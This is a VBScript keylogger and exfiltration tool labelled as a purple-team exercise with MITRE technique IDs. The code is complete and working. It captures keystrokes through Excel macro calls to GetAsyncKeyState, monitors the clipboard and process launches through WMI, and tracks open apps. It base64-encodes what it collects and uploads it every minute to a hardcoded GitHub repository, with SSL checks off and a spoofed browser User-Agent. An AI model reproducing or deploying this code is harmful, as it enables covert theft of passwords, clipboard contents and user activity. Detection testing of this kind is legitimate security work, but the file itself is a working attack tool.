' Purple Team - Exfiltration Monitor (Keys + Clip + Exec + Apps → GitHub)
' MITRE: T1056.001, T1115, T1057, T1567.001 (Exfil to Code Repository)
'
' Captures everything and exfiltrates base64-encoded to your GitHub repo
' via the GitHub API (HTTPS to api.github.com - blends with dev traffic)
'
' SETUP:
'   1. Create a GitHub Personal Access Token (PAT) with "repo" scope
'      https://github.com/settings/tokens → Generate new token (classic)
'   2. Set your token below or pass via environment variable
'
' Usage: wscript.exe //nologo //B exfmonitor.vbs
'
' XDR detections this should trigger:
'   - HTTPS POST to api.github.com from wscript.exe
'   - Base64-encoded payloads in outbound traffic
'   - Periodic data uploads to code repository
'

' ═════════════════════════════════════════════════════════════════
'  CONFIG - Edit these before deploying
' ═════════════════════════════════════════════════════════════════
Dim GH_TOKEN, GH_OWNER, GH_REPO, EXFIL_INTERVAL

Dim envShell
Set envShell = CreateObject("WScript.Shell")

' GitHub PAT - set here or via env var GH_PAT
GH_TOKEN = envShell.ExpandEnvironmentStrings("%GH_PAT%")
If GH_TOKEN = "%GH_PAT%" Or GH_TOKEN = "" Then
    GH_TOKEN = "YOUR_GITHUB_PAT_HERE"
End If

GH_OWNER = "vidadi123"
GH_REPO  = "api-keylogger-purpleteam"
EXFIL_INTERVAL = 60  ' seconds between exfil pushes

' ═════════════════════════════════════════════════════════════════
'  INIT
' ═════════════════════════════════════════════════════════════════
Dim fso, oShell, oNet
Dim logPath, lastClip, lastProcs, lastWin
Dim keyBuf, clipBuf, execBuf, appBuf
Dim hasXL, xl
Dim flushTimer, exfilTimer, appTimer

Set fso    = CreateObject("Scripting.FileSystemObject")
Set oShell = CreateObject("WScript.Shell")
Set oNet   = CreateObject("WScript.Network")

logPath   = oShell.ExpandEnvironmentStrings("%TEMP%") & "\log.txt"
lastClip  = ""
lastProcs = ""
lastWin   = ""
keyBuf    = ""
clipBuf   = ""
execBuf   = ""
appBuf    = ""

' ── Load Excel for keystroke capture ────────────────────────────
On Error Resume Next
Set xl = CreateObject("Excel.Application")
If Err.Number = 0 Then
    xl.Visible = False
    xl.DisplayAlerts = False
    xl.ScreenUpdating = False
    hasXL = True
Else
    hasXL = False
End If
Err.Clear
On Error GoTo 0

' ── WMI process watcher ─────────────────────────────────────────
Dim objWMI, watcher
Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
Set watcher = objWMI.ExecNotificationQuery( _
    "SELECT * FROM __InstanceCreationEvent WITHIN 3 " & _
    "WHERE TargetInstance ISA 'Win32_Process'")

' Timers
Dim tFlush, tExfil, tApp
tFlush = Timer
tExfil = Timer
tApp   = Timer

Randomize

Dim mode
If hasXL Then mode = "FULL" Else mode = "CLIP+EXEC+APPS"

' Local log + first exfil marker
LogIt "[+] ExfMonitor started | " & oNet.ComputerName & "\" & oNet.UserName & _
      " | Mode: " & mode & " | Exfil: GitHub/" & GH_OWNER & "/" & GH_REPO

' ═════════════════════════════════════════════════════════════════
'  MAIN LOOP
' ═════════════════════════════════════════════════════════════════
Do While True
    On Error Resume Next

    ' ── Keystroke capture via Excel CALL ─────────────────────────
    If hasXL Then
        Dim shState, isShift, vk, kState, ch

        shState = CLng(xl.ExecuteExcel4Macro( _
            "CALL(""user32"",""GetAsyncKeyState"",""JJ"",16)"))
        isShift = ((shState And &H8000) <> 0)

        Dim checkKeys
        checkKeys = Array(8, 9, 13, 32, _
            48,49,50,51,52,53,54,55,56,57, _
            65,66,67,68,69,70,71,72,73,74,75,76,77, _
            78,79,80,81,82,83,84,85,86,87,88,89,90, _
            186,187,188,189,190,191)

        Dim i
        For i = 0 To UBound(checkKeys)
            vk = checkKeys(i)
            kState = CLng(xl.ExecuteExcel4Macro( _
                "CALL(""user32"",""GetAsyncKeyState"",""JJ""," & vk & ")"))
            If (kState And 1) = 1 Then
                ch = MapKey(vk, isShift)
                If ch <> "" Then keyBuf = keyBuf & ch
            End If
        Next

        ' Flush keys to exfil buffer every 10-20s
        If (Timer - tFlush) >= (10 + Int(Rnd * 10)) Then
            If Len(keyBuf) > 0 Then
                Dim winTitle
                winTitle = GetActiveApp()
                Dim ts
                ts = NowStamp()
                If winTitle <> lastWin And winTitle <> "" Then
                    lastWin = winTitle
                    appBuf = appBuf & "[" & ts & "] [WIN] " & winTitle & vbCrLf
                End If
                LogIt "[KEYS] " & keyBuf
                execBuf = execBuf & "[" & ts & "] [KEYS] " & keyBuf & vbCrLf
                keyBuf = ""
            End If
            tFlush = Timer
        End If
    End If

    ' ── Process creation events ──────────────────────────────────
    Dim evt
    Set evt = watcher.NextEvent(50)
    If Err.Number = 0 And Not evt Is Nothing Then
        Dim pName, pCmd, pPid
        pName = evt.TargetInstance.Name
        pCmd  = evt.TargetInstance.CommandLine
        pPid  = evt.TargetInstance.ProcessId
        Select Case LCase(pName)
            Case "cmd.exe", "powershell.exe", "pwsh.exe", _
                 "net.exe", "net1.exe", "ipconfig.exe", "whoami.exe", _
                 "tasklist.exe", "systeminfo.exe", "reg.exe", "sc.exe", _
                 "certutil.exe", "mshta.exe", "rundll32.exe", "wmic.exe", _
                 "ssh.exe", "scp.exe", "ftp.exe", "curl.exe", _
                 "notepad.exe", "mstsc.exe", "python.exe"
                Dim execLine
                execLine = "[" & NowStamp() & "] [EXEC] " & pName & " (PID:" & pPid & ") " & Left(pCmd, 300)
                LogIt "[EXEC] " & pName & " " & Left(pCmd, 200)
                execBuf = execBuf & execLine & vbCrLf
        End Select
    End If
    Err.Clear

    ' ── Clipboard monitoring ─────────────────────────────────────
    Dim clipTxt
    clipTxt = GetClipboard()
    If Len(clipTxt) > 0 And clipTxt <> lastClip Then
        lastClip = clipTxt
        Dim clipLine
        clipLine = "[" & NowStamp() & "] [CLIP] " & Left(clipTxt, 500)
        LogIt "[CLIP] " & Left(clipTxt, 500)
        clipBuf = clipBuf & clipLine & vbCrLf
    End If

    ' ── Active app tracking (every ~15s) ─────────────────────────
    If (Timer - tApp) >= 15 Then
        Dim curProcs
        curProcs = GetUserProcs()
        If curProcs <> lastProcs And curProcs <> "" Then
            lastProcs = curProcs
            Dim appLine
            appLine = "[" & NowStamp() & "] [APPS] " & curProcs
            LogIt "[APPS] " & curProcs
            appBuf = appBuf & appLine & vbCrLf
        End If
        tApp = Timer
    End If

    ' ── EXFILTRATE TO GITHUB (every EXFIL_INTERVAL seconds) ─────
    If (Timer - tExfil) >= EXFIL_INTERVAL Then
        Dim allData
        allData = clipBuf & execBuf & appBuf

        If Len(allData) > 0 Then
            ' Build the exfil payload
            Dim encoded
            encoded = B64Encode(allData)

            ' Push to GitHub as a new file
            Dim fileName
            fileName = "data/" & LCase(oNet.ComputerName) & "_" & _
                       Replace(Replace(Replace(NowStamp(), "-", ""), " ", "_"), ":", "") & ".log"

            Dim pushResult
            pushResult = GitHubPush(fileName, encoded)
            LogIt "[EXFIL] " & fileName & " (" & Len(allData) & " bytes) → " & pushResult

            ' Clear buffers after successful exfil
            If pushResult = "OK" Then
                clipBuf = ""
                execBuf = ""
                appBuf  = ""
            End If
        End If

        tExfil = Timer
    End If

    On Error GoTo 0

    If hasXL Then
        WScript.Sleep 30
    Else
        WScript.Sleep 2000 + Int(Rnd * 1000)
    End If
Loop

' ═════════════════════════════════════════════════════════════════
'  GITHUB API - Push encoded data as a file
' ═════════════════════════════════════════════════════════════════
Function GitHubPush(filePath, b64Content)
    On Error Resume Next
    GitHubPush = "FAIL"

    Dim url, body, http
    url = "https://api.github.com/repos/" & GH_OWNER & "/" & GH_REPO & "/contents/" & filePath

    ' GitHub API requires the content to be base64 encoded
    ' Our data is already base64 encoded, but GitHub needs its own base64 layer
    ' So we send our b64 string as the content (GitHub will base64 it again in transit)
    Dim contentForGH
    contentForGH = B64Encode(b64Content)

    body = "{" & _
        """message"":""u""," & _
        """content"":""" & contentForGH & """" & _
    "}"

    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    http.setOption 2, 13056  ' Ignore SSL errors
    http.Open "PUT", url, False
    http.setRequestHeader "Authorization", "Bearer " & GH_TOKEN
    http.setRequestHeader "Accept", "application/vnd.github+json"
    http.setRequestHeader "Content-Type", "application/json"
    http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    http.setRequestHeader "X-GitHub-Api-Version", "2022-11-28"
    http.Send body

    If http.Status = 201 Or http.Status = 200 Then
        GitHubPush = "OK"
    Else
        GitHubPush = "HTTP " & http.Status
    End If

    Set http = Nothing
    On Error GoTo 0
End Function

' ═════════════════════════════════════════════════════════════════
'  BASE64 ENCODE (VBScript native via MSXML)
' ═════════════════════════════════════════════════════════════════
Function B64Encode(sText)
    On Error Resume Next
    Dim oXML, oNode, oStream

    ' Convert string to byte array
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Type = 2  ' text
    oStream.Charset = "utf-8"
    oStream.Open
    oStream.WriteText sText
    oStream.Position = 0
    oStream.Type = 1  ' binary
    Dim bytes
    bytes = oStream.Read
    oStream.Close
    Set oStream = Nothing

    ' Base64 encode
    Set oXML = CreateObject("MSXML2.DOMDocument.3.0")
    Set oNode = oXML.createElement("b64")
    oNode.DataType = "bin.base64"
    oNode.NodeTypedValue = bytes
    B64Encode = Replace(Replace(oNode.Text, vbCr, ""), vbLf, "")

    Set oNode = Nothing
    Set oXML = Nothing
    On Error GoTo 0
End Function

' ═════════════════════════════════════════════════════════════════
'  KEY MAPPING
' ═════════════════════════════════════════════════════════════════
Function MapKey(vk, sh)
    MapKey = ""
    Select Case vk
        Case 8:   MapKey = "[BS]"
        Case 9:   MapKey = "[TAB]"
        Case 13:  MapKey = "[EN]"
        Case 32:  MapKey = " "
        Case 48:  If sh Then MapKey = ")" Else MapKey = "0"
        Case 49:  If sh Then MapKey = "!" Else MapKey = "1"
        Case 50:  If sh Then MapKey = "@" Else MapKey = "2"
        Case 51:  If sh Then MapKey = "#" Else MapKey = "3"
        Case 52:  If sh Then MapKey = "$" Else MapKey = "4"
        Case 53:  If sh Then MapKey = "%" Else MapKey = "5"
        Case 54:  If sh Then MapKey = "^" Else MapKey = "6"
        Case 55:  If sh Then MapKey = "&" Else MapKey = "7"
        Case 56:  If sh Then MapKey = "*" Else MapKey = "8"
        Case 57:  If sh Then MapKey = "(" Else MapKey = "9"
        Case 186: If sh Then MapKey = ":" Else MapKey = ";"
        Case 187: If sh Then MapKey = "+" Else MapKey = "="
        Case 188: If sh Then MapKey = "<" Else MapKey = ","
        Case 189: If sh Then MapKey = "_" Else MapKey = "-"
        Case 190: If sh Then MapKey = ">" Else MapKey = "."
        Case 191: If sh Then MapKey = "?" Else MapKey = "/"
    End Select
    If vk >= 65 And vk <= 90 Then
        If sh Then MapKey = Chr(vk) Else MapKey = Chr(vk + 32)
    End If
End Function

' ═════════════════════════════════════════════════════════════════
'  HELPERS
' ═════════════════════════════════════════════════════════════════
Function GetClipboard()
    On Error Resume Next
    Dim hDoc
    Set hDoc = CreateObject("htmlfile")
    GetClipboard = hDoc.parentWindow.clipboardData.GetData("text")
    Set hDoc = Nothing
    If Err.Number <> 0 Then GetClipboard = ""
    On Error GoTo 0
End Function

Function GetActiveApp()
    On Error Resume Next
    Dim wmi, procs, p, topApp
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set procs = wmi.ExecQuery("SELECT Name FROM Win32_Process WHERE SessionId > 0")
    topApp = ""
    For Each p In procs
        Select Case LCase(p.Name)
            Case "chrome.exe", "msedge.exe", "firefox.exe", _
                 "notepad.exe", "cmd.exe", "outlook.exe", _
                 "teams.exe", "slack.exe", "winword.exe", _
                 "excel.exe", "code.exe", "mstsc.exe"
                topApp = p.Name
        End Select
    Next
    Set wmi = Nothing
    GetActiveApp = topApp
    On Error GoTo 0
End Function

Function GetUserProcs()
    On Error Resume Next
    Dim wmi, procs, p, pList, pn
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set procs = wmi.ExecQuery("SELECT Name FROM Win32_Process WHERE SessionId > 0")
    pList = ""
    For Each p In procs
        pn = LCase(p.Name)
        If pn = "chrome.exe" Or pn = "msedge.exe" Or pn = "firefox.exe" Or _
           pn = "notepad.exe" Or pn = "cmd.exe" Or pn = "outlook.exe" Or _
           pn = "teams.exe" Or pn = "slack.exe" Or pn = "winword.exe" Or _
           pn = "excel.exe" Or pn = "code.exe" Or pn = "mstsc.exe" Or _
           pn = "powershell.exe" Or pn = "putty.exe" Then
            If InStr(pList, p.Name) = 0 Then pList = pList & p.Name & " "
        End If
    Next
    Set wmi = Nothing
    GetUserProcs = Trim(pList)
    On Error GoTo 0
End Function

Function NowStamp()
    NowStamp = Year(Now) & "-" & Right("0" & Month(Now), 2) & "-" & Right("0" & Day(Now), 2) & _
               " " & Right("0" & Hour(Now), 2) & ":" & Right("0" & Minute(Now), 2) & ":" & _
               Right("0" & Second(Now), 2)
End Function

Sub LogIt(msg)
    On Error Resume Next
    Dim f
    Set f = fso.OpenTextFile(logPath, 8, True)
    f.WriteLine "[" & NowStamp() & "] " & msg
    f.Close
    Set f = Nothing
    On Error GoTo 0
End Sub
